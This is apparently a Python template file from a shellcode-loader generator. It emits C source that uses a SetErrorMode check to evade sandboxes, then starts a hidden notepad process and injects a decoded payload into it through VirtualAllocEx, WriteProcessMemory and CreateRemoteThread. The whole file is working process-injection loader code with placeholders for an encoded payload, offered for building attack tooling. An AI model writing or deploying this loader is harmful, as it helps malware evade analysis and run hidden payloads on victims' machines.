###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/createremotethread"
from templates.template import *
class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
<TABLES>

int main()
{

  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }
    <DECODE>
    STARTUPINFO si = { 0 };
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW;
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);

    CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, 0, sizeof(offset_table), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, lpBaseAddress, lpBuffer, sizeof(offset_table), NULL);
    CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
    return 0;
}
'''
        return c_code

